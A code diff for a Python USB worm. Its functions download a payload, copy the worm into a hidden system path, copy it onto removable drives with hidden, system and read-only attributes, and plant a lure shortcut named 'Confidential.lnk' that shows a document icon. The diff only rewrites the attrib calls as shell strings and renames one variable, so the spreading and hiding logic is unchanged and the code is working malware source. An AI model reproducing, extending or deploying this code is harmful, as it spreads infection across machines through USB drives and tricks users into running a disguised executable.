@@ -41,7 +41,7 @@ def download_payload():
             response = requests.get(init_url)
             with open(PAYLOAD_PATH, 'wb') as f:
                 f.write(response.content)
-                subprocess.run(['attrib', '+h', '+s', '+r', PAYLOAD_PATH], shell=True)
+                subprocess.run(f"attrib +h +s +r {PAYLOAD_PATH}", shell=True)
         except: pass
 
 def create_scheduled_tasks(self_only = False):
@@ -58,15 +58,15 @@ def install_worm():
     if not os.path.exists(os.path.dirname(WORM_PATH)):
         os.makedirs(os.path.dirname(WORM_PATH))
     shutil.copy(sys.executable, WORM_PATH)
-    subprocess.run(['attrib', '+h', '+s', '+r', WORM_PATH], shell=True)
+    subprocess.run(f"attrib +h +s +r {WORM_PATH}", shell=True)
 
 def create_shortcut(drive):
     """Create a shortcut (Confidential.lnk) on USB pointing to the usb worm"""
     try:
-        shell = Dispatch('WScript.Shell')
+        wscript = Dispatch('WScript.Shell')
         shortcut_path = os.path.join(drive, SHORTCUT_NAME)
         target_path = os.path.join(drive, WORM_NAME)
-        shortcut = shell.CreateShortCut(shortcut_path)
+        shortcut = wscript.CreateShortCut(shortcut_path)
         shortcut.TargetPath = target_path
         shortcut.IconLocation = "%SystemRoot%\\system32\\shell32.dll,70"  # PDF icon
         shortcut.Description = "Confidential Document"
@@ -77,7 +77,7 @@ def create_shortcut(drive):
 def infect_usb(drive):
     worm_dest = os.path.join(drive, WORM_NAME)
     shutil.copy(sys.executable, worm_dest)
-    subprocess.run(['attrib', '+h', '+s', '+r', worm_dest], shell=True)  # Hide worm
+    subprocess.run(f"attrib +h +s +r {worm_dest}", shell=True)  # Hide worm
     create_shortcut(drive)  # Create lure shortcut
 
 def monitor_usb():
